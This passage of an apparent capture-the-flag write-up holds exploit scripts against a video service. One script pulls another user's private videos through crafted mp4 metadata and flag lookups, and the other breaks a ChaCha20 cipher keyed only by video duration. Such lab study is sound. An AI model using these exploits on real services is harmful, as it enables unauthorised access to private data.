</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;copy&#34;</span><span class="p">,</span> <span class="n">output_path</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brainfuck</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">fid</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username_f</span> <span class="o">=</span> <span class="n">fid</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s1">:7777&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">username_f</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;User ID must be set&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">)),</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;python-httpx/0.23.3&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span> <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/newuser&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/checkcredentials&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">userid</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/get_user_info_with_name/</span><span class="si">{</span><span class="n">username_f</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">video</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/get_private_videos/</span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;metadata_</span><span class="si">{</span><span class="n">video</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s1">_</span><span class="si">{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="si">}</span><span class="s1">.mp4&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="n">video</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">username_f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">video</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">add_metadata</span><span class="p">(</span><span class="s1">&#39;video.mp4&#39;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">artist</span><span class="o">=</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">genre</span><span class="o">=</span><span class="n">m</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/app/create_video&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">video</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;description&#39;</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;is_private&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;location&#39;</span><span class="p">:</span> <span class="n">video</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;thumbnail&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;thumbnail.png&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/get_video_info/&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/get_my_videos&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;path&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">brainfuck</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;description&#39;</span><span class="p">]),</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">getid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="nb">round</span> <span class="ow">in</span> <span class="n">getid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">attack</span><span class="p">(</span><span class="n">getid</span><span class="p">[</span><span class="nb">round</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">attack</span><span class="p">()</span>
</span></span></code></pre></div><p>E</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">Set</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PER_LETTER</span> <span class="o">=</span> <span class="mi">4096</span> <span class="o">//</span> <span class="mi">26</span>
</span></span><span class="line"><span class="cl"><span class="n">alph</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brainfuck</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_spanish_words</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;spanish_words.txt&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">all_words</span> <span class="o">=</span> <span class="p">[</span><span class="n">w</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">raw</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span> <span class="k">if</span> <span class="n">w</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">groups</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">bytes</span><span class="p">,</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]]</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">all_words</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">first</span> <span class="o">=</span> <span class="n">w</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">&lt;=</span> <span class="n">first</span> <span class="o">&lt;=</span> <span class="sa">b</span><span class="s1">&#39;z&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">groups</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="p">[])</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">used</span><span class="p">:</span> <span class="n">Set</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">letter_ord</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">letter</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">letter_ord</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">bucket</span> <span class="o">=</span> <span class="n">groups</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">letter</span><span class="p">,</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">bucket</span><span class="p">[:</span><span class="n">PER_LETTER</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">w</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">used</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">used</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">all_words</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">4096</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">w</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">used</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">used</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4096</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Expected 4096 words, got </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_spanish_stream</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher_words</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">duration_secs</span><span class="p">:</span> <span class="nb">float</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">words_file</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;spanish_words.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">table</span> <span class="o">=</span> <span class="n">build_spanish_words</span><span class="p">(</span><span class="n">words_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">inv_table</span> <span class="o">=</span> <span class="p">{</span><span class="n">w</span><span class="p">:</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">table</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">bit_buf</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">bit_count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">cipher_words</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">idx</span> <span class="o">=</span> <span class="n">inv_table</span><span class="p">[</span><span class="n">w</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Questa situazione non dovrebbe verificarsi con la corretta gestione dei byte</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mi">4096</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Word index out of range: </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">bit_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit_buf</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="n">idx</span>
</span></span><span class="line"><span class="cl">        <span class="n">bit_count</span> <span class="o">+=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">bit_count</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">bit_count</span> <span class="o">-=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">            <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit_buf</span> <span class="o">&gt;&gt;</span> <span class="n">bit_count</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">            <span class="n">cipher_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ms</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">duration_secs</span> <span class="o">*</span> <span class="mf">1000.0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">ms</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ms</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="n">ms</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">seed</span>
</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">ChaCha20</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="p">),</span> <span class="n">mode</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span><span class="o">.</span><span class="n">encryptor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">keystream</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">plain_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">cb</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">kb</span> <span class="o">=</span> <span class="n">keystream</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">plain_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">cb</span> <span class="o">^</span> <span class="n">kb</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">plain_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;python-httpx/0.23.3&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span> <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extract_vtt_text</span><span class="p">(</span><span class="n">vtt_content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">vtt_content</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">text_lines</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">br</span><span class="s1">&#39;^\d+$&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">br</span><span class="s1">&#39;^\d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">\.\d</span><span class="si">{3}</span><span class="s1"> --&gt; \d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">\.\d</span><span class="si">{3}</span><span class="s1">$&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;WEBVTT&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">text_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Unisce tutte le linee di testo e poi le suddivide in parole</span>
